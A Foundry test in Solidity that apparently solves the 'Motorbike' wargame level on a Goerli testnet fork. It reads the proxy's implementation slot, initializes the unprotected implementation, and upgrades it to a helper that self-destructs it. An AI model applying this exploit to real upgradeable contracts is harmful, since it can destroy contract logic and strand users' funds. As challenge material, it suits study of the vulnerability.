// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Motorbike} from "src/Motorbike.sol";
import {Engine} from "src/Engine.sol";
import {Selfdestructable} from "src/Selfdestructable.sol";

contract MotorbikeTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("GOERLI_RPC_URL"));
    }

    function test_Exploit() public {
        address motorbike = 0xB4c375181a8Bc3B142dEF2580a944351cD26ca4B;
        address impl = address(
            uint160(uint256(vm.load(motorbike, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))
        );

        Selfdestructable helper = new Selfdestructable();

        Engine(impl).initialize();
        Engine(impl).upgradeToAndCall(address(helper), abi.encodeWithSelector(Selfdestructable.destroy.selector));
    }
}
